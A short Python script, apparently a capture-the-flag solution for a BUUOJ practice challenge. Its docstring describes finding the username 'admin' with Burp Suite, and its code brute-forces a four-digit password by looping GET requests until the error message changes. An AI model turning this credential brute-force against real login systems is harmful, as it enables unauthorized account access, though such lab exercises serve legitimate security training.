"""
    can use burpsuite to test
    first test username by load username.txt
    this can detect username is admin
    then test password is a 4 numbers, e.g. 1000-9999



"""

import requests
url = "http://ceeed4e8-1dd2-4fb5-8a98-3bda683fa9bf.node3.buuoj.cn/?username=admin&password="
for i in range(1000, 9999):
    res = requests.get(url + str(i))
    print("[*] Try:", i)
    if res.text != "密码错误，为四位数字。":
        print(res.text)
        break